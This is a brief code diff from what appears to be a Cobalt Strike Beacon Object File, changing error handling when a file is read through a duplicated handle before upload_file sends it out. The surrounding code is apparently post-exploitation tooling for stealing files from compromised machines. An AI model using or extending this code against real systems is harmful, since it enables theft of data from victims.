@@ -301,9 +301,10 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                     BeaconPrintf(CALLBACK_OUTPUT,"File size is %d\n", dwFileSize);
                     //Allocate memory for buffer
                     DWORD dwRead = 0;
-                    BOOL status = true;
                     CHAR* buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
-                    status = ReadFile(dupHandle, buffer, dwFileSize, &dwRead, NULL);
+                    if (!ReadFile(dupHandle, buffer, dwFileSize, &dwRead, NULL)) {
+                        continue;
+                    }
 
                     #ifdef _DEBUG
                     // Construct the full path to the file on the desktop
